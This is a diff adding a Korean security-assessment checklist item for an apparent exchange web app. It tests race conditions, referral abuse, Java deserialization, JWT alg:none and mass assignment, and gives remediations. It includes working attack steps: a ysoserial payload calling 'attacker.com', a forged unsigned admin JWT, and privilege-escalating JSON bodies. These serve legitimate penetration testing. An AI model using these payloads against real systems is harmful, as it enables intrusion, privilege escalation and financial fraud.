@@ -1,0 +1,171 @@
+================================================================================
+[VCE-EX-27] 취약점 진단 항목에 정의되지 않은 취약점 (거래소 특화)
+도메인: exchange
+================================================================================
+
+1. 진단 항목 개요
+   - 항목명: 미정의 취약점 — Race Condition, Java 역직렬화, 레퍼럴 남용, Mass Assignment
+   - 번호: EX-27
+   - 위험도: Critical/High (복합)
+
+2. 대상 기능 & 엔드포인트
+   - POST /api/orders                  — Race Condition (잔고 초과 주문)
+   - POST /api/assets/deposit          — 무제한 입금, 레퍼럴 코드 남용
+   - OAuth2 쿠키                       — Java 역직렬화
+   - POST /api/auth/signup/complete    — Mass Assignment
+
+3. 취약점 원리 (Why this works)
+
+   [취약점 A] Race Condition — 잔고 초과 주문 생성
+   잔고 확인 → 주문 생성 → 잔고 차감이 비원자적으로 처리되면
+   동시 요청으로 잔고보다 많은 수량의 주문이 생성된다.
+
+   [취약점 B] 레퍼럴 코드 남용
+   DataInitializer.java 또는 가입 로직에서 레퍼럴 코드 입력 시 보너스(70,000원)를 지급한다.
+   자기 자신의 레퍼럴 코드를 입력하거나, 여러 계정을 생성하여 중복 수령이 가능한지 확인한다.
+
+   [취약점 C] Java 역직렬화
+   HttpCookieOAuth2AuthorizationRequestRepository.java:97 에서
+   ObjectInputStream.readObject()로 쿠키를 역직렬화한다.
+   악성 직렬화 페이로드를 쿠키에 삽입하면 RCE가 가능하다.
+
+   [취약점 D] JWT alg:none 공격
+   JwtTokenProvider가 alg:none을 명시적으로 거부하지 않으면
+   서명 없는 토큰으로 인증 우회가 가능하다.
+
+   [취약점 E] 대량 할당 (Mass Assignment)
+   @RequestBody로 DTO에 매핑 시 DTO에 정의되지 않은 필드(role, isAdmin 등)가
+   바인딩되면 권한 상승이 가능하다.
+
+4. 테스트 절차 (Step-by-step)
+
+   [취약점 A] Race Condition 테스트
+
+   Step 1. 잔고 0.001 BTC 확보 후 동시 SELL 주문 5개 발송
+   --- bash 스크립트 ---
+   JWT="<your_jwt>"
+   for i in $(seq 1 5); do
+     curl -s -X POST http://localhost:8080/api/orders \
+       -H "Authorization: Bearer $JWT" \
+       -H "Content-Type: application/json" \
+       -d '{"assetType":"BTC","orderType":"SELL","price":90000000,"amount":0.001}' &
+   done
+   wait
+   ---
+
+   Burp Suite Turbo Intruder 설정:
+   concurrentConnections=20, requestsPerConnection=1
+
+   Step 2. 미체결 주문 목록 확인
+   --- HTTP 요청 예시 ---
+   GET /api/orders/open HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <JWT>
+   ---
+   2개 이상 SELL 주문 존재 시 Race Condition 확인
+
+   ---
+   [취약점 B] 레퍼럴 코드 남용 테스트
+
+   Step 3. 자신의 레퍼럴 코드 확인
+   --- HTTP 요청 예시 ---
+   GET /api/auth/me HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <JWT>
+   ---
+   응답에서 referralCode 필드 확인
+
+   Step 4. 가입 시 자신의 레퍼럴 코드 입력
+   --- HTTP 요청 예시 ---
+   POST /api/auth/signup/complete HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <GUEST_JWT>
+   Content-Type: application/json
+
+   {"password":"Test1234!","referralCode":"<자신의_레퍼럴코드>"}
+   ---
+   보너스가 중복 지급되는지 잔고 변화 확인
+
+   ---
+   [취약점 C] Java 역직렬화 테스트
+
+   Step 5. OAuth2 쿠키 값 확인
+   --- HTTP 요청 예시 ---
+   GET /oauth2/authorization/google HTTP/1.1
+   Host: localhost:8080
+   ---
+   Set-Cookie 헤더에서 Base64 값 확인
+
+   값을 디코드:
+   echo "<cookie_value>" | base64 -d | xxd | head -3
+   첫 바이트: ac ed 00 05 → Java 직렬화 객체 확인
+
+   Step 6. ysoserial 페이로드 생성
+   java -jar ysoserial.jar CommonsCollections1 "curl http://attacker.com/rce" | base64 -w 0
+
+   --- HTTP 요청 예시 ---
+   GET /login/oauth2/code/google?code=test&state=test HTTP/1.1
+   Host: localhost:8080
+   Cookie: oauth2_auth_request=<악성_base64_페이로드>
+   ---
+
+   ---
+   [취약점 D] JWT alg:none 공격
+
+   Step 7. alg:none 토큰 생성
+   python3 -c "
+   import base64, json
+   h = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
+   p = base64.urlsafe_b64encode(json.dumps({'sub':'admin@vce.com','role':'ADMIN','exp':9999999999}).encode()).rstrip(b'=')
+   print(h.decode()+'.'+p.decode()+'.')
+   "
+
+   --- HTTP 요청 예시 ---
+   GET /api/admin/members HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <alg_none_토큰>
+   ---
+
+   ---
+   [취약점 E] Mass Assignment
+
+   Step 8. DTO 외 필드 삽입 시도
+   --- HTTP 요청 예시 ---
+   POST /api/auth/signup/complete HTTP/1.1
+   Host: localhost:8080
+   Authorization: Bearer <GUEST_JWT>
+   Content-Type: application/json
+
+   {
+     "password": "Test1234!",
+     "name": "공격자",
+     "role": "ADMIN",
+     "isAdmin": true,
+     "status": "ACTIVE",
+     "balance": 999999999
+   }
+   ---
+
+5. 취약 여부 판단 기준
+   ✅ 취약 (Vulnerable):
+      [A] 동시 주문 2개 이상 성공 (잔고 초과)
+      [B] 자신 레퍼럴 코드로 보너스 중복 수령
+      [C] OOB DNS/HTTP 요청 수신 (역직렬화 RCE)
+      [D] alg:none 토큰으로 인증 통과
+      [E] role=ADMIN 필드 바인딩으로 관리자 권한 획득
+   ✗ 안전 (Not Vulnerable):
+      각 취약점에 대한 적절한 거부 응답
+
+6. 예상 취약 포인트 (코드 위치)
+   - OrderService.java — 잔고 확인/주문 생성 비원자적 처리 (Race Condition)
+   - DataInitializer.java / MemberService.java — 레퍼럴 코드 중복 검증 없음
+   - HttpCookieOAuth2AuthorizationRequestRepository.java:97 — ObjectInputStream.readObject()
+   - JwtTokenProvider.java — alg 필드 검증 없음
+   - SignupRequestDto.java — @JsonIgnoreProperties 없음 (Mass Assignment)
+
+7. 권고 조치
+   - Race Condition: 비관적 락 (SELECT FOR UPDATE) 또는 DB 레벨 제약 추가
+   - 레퍼럴: 자기 자신 코드 입력 차단, 계정별 1회 수령 제한
+   - 역직렬화: ObjectInputStream → JSON 직렬화로 교체
+   - alg:none: Jwts.parser()에서 허용 알고리즘 명시적 지정
+   - Mass Assignment: DTO에 @JsonIgnoreProperties(ignoreUnknown=true) 또는 필드 명시
